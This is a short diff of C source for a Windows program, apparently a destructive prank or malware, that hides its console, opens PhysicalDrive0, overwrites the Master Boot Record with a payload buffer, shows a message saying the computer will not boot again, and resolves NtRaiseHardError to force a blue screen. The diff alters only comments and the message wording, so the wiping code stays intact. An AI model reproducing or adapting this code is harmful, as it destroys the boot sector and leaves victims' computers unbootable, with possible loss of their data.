@@ -5,18 +5,17 @@ int main()
 	FreeConsole(); //Hide the console.
 	DWORD dw;
 	HANDLE hDrive = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
-	//Now we have a handle to our dear MBR.
-	//We're going now to overwrite it...
-	//Write the mbrData data to hDrive.
+	//Now that we have a handle to the Master Boot Record,
+	//We're going to overwrite its contents with the bootloader
 	WriteFile(hDrive, mbrData, sizeof(mbrData), &dw, NULL);
 	//DONE!
 	//Now let's close the handle...
 	CloseHandle(hDrive);
 	//Show a message box.
-	MessageBox(NULL, "Your MBR has been overwritten!!!", "NOTIFICATION", MB_OK | MB_ICONERROR);
-	//If the user clicks OK, cause BSOD.
-	//Credit: Leurak
-	HMODULE ntdll = LoadLibraryA("ntdll"); //Load the NTDLL library.
+	MessageBox(NULL, "I don't think your computer is going to be able to boot up next time...", "NOTIFICATION", MB_OK | MB_ICONERROR);
+	//If the user clicks OK, cause an immediate BSoD.
+	//(Credit: Leurak :P)
+	HMODULE ntdll = LoadLibraryA("ntdll");
 	FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
 	FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");
 
